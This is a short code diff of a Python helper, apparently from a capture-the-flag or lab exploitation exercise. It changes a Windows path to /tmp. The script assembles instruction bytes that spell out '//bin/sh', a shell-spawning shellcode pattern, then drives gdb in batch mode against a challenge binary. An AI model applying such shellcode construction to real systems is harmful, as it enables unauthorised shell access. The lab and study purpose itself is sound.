@@ -1,6 +1,6 @@
 import sys, subprocess
 sys.stdout.reconfigure(encoding="utf-8", errors="replace")
-CWD = r"C:\Users\arnol\AppData\Local\Temp\cylab_eps"
+CWD = r"/tmp/cylab_eps"
 ins = ["89e7"]
 for ch in "//bin/sh":
     ins.append("b0%02x" % ord(ch))
@@ -21,7 +21,7 @@ quit
 """
 open(CWD + r"\g184b.gdb", "w").write(gdb)
 out = subprocess.run(["wsl", "-d", "kali-linux", "--", "bash", "-c",
-                      "cd /mnt/c/Users/arnol/AppData/Local/Temp/cylab_eps && "
+                      "cd /tmp/cylab_eps && "
                       "gdb -nx -q -batch -x g184b.gdb ./184_fun 2>&1 | tail -24"],
                      capture_output=True, text=True).stdout
 print(out)
